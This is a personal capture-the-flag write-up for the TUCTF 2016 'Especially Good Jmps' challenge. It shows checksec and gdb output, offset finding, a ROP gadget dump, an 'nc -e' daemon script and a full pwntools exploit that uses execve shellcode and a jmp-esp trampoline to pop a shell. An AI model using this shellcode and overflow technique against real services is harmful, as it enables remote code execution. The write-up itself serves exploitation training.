Description:

> Especially Good Jmps
> Pop a shell.
> Binary is hosted at: 130.211.202.98:7575
> EDIT:
> ASLR is enabled on remote server.

This is some of my personal note. Finally i am back to Linux Exploit

Check Security
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

Finding EBP and EIP Overwrite
```
gdb-peda$ pattern_create  50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'

gdb-peda$ r
Starting program: /home/xwings/ctf/tuctf-2016/pwn-espgoodjump-75/23e4f31a5a8801a554e1066e26eb34745786f4c4
What's your name?
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
What's your favorite number?
11
Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA, 11 is an odd number!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fb7000 --> 0x1b3da4
ECX: 0xb7fb8ad0 --> 0x0
EDX: 0x0
ESI: 0x0
EDI: 0x8048420 (<_start>:	xor    ebp,ebp)
EBP: 0x41304141 ('AA0A')
ESP: 0xbffff5b0 --> 0x4162 ('bA')
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xbffff5b0 --> 0x4162 ('bA')
0004| 0xbffff5b4 --> 0xbffff644 --> 0xbffff76d ("/home/xwings/ctf/tuctf-2016/pwn-espgoodjump-75/23e4f31a5a8801a554e1066e26eb34745786f4c4")
0008| 0xbffff5b8 --> 0xbffff64c --> 0xbffff7c5 ("XDG_SESSION_ID=3")
0012| 0xbffff5bc --> 0x0
0016| 0xbffff5c0 --> 0x0
0020| 0xbffff5c4 --> 0x0
0024| 0xbffff5c8 --> 0x0
0028| 0xbffff5cc --> 0x8048270 --> 0x62696c00 ('')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()

gdb-peda$ pattern_search 0x41414641
Registers contain pattern buffer:
EIP+0 found at offset: 44
EBP+0 found at offset: 40
No register points to pattern buffer
Pattern buffer found at:
0xb7fd6003 : offset    3 - size   47 (mapped)
0xb7fd7006 : offset    0 - size   50 (mapped)
0xbffff580 : offset    0 - size   50 ($sp + -0x30 [-12 dwords])
0xbffffe24 : offset 31577 - size    5 ($sp + 0x874 [541 dwords])
References to pattern buffer found at:
0xb7fb7608 : 0xb7fd6003 (/lib/i386-linux-gnu/i686/cmov/libc-2.21.so)
0xbffff574 : 0xbffff580 ($sp + -0x3c [-15 dwords])
```

Finding ROP
```
gdb-peda$ dumprop
Warning: this can be very slow, do not run for large memory range
Writing ROP gadgets to file: 23e4f31a5a8801a554e1066e26eb34745786f4c4-rop.txt ...
0x8049650: ret
0x8049381: retf
0x80494ec: repz ret
0x804949e: ret 0xeac1
0x8049488: leave; ret
0x80497ac: inc ecx; ret
0x804964f: pop ebp; ret
0x804939d: pop ebx; ret
0x804965f: nop; repz ret
0x8049487: ror cl,1; ret
0x80494c4: ror cl,cl; ret
0x804937f: or al,ch; retf
0x80495de: add cl,cl; ret
```

Running as daemon

```
$ cat fakeserver.sh
while true;
do
  nc -l -p 7575 -e ./23e4f31a5a8801a554e1066e26eb34745786f4c4
done
```


Exploit
```
#!/usr/bin/env python

import socket
import sys
import struct
import time
from pwn import *
from struct import pack as p, unpack as u

def p32(addr):
    return struct.pack("<I", addr)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
jmpesp = '\x90\x90\xff\xe4'

HOST="127.0.0.1"
PORT=7575

totalpad = 40
ebpwrite  = 0xDEADBEEF
eipwrite =0x0804A048

payload = "\x90" * totalpad       # NOPs minus JMP
payload += p32(ebpwrite)
payload += p32(eipwrite)
payload += shellcode

r = remote(HOST, PORT)

#data = sock.recv(2048)
print r.recvuntil('What\'s your name?\n')
r.sendline(payload)
print r.recvuntil('What\'s your favorite number?\n')

# construct 4-byte trampoline in meow
h = '\x90\x90\xff\xe4' # jmp esp = ff e4
trampoline = u('<i', h)
print trampoline
r.sendline("%d" % trampoline)

r.interactive()
r.close()
```
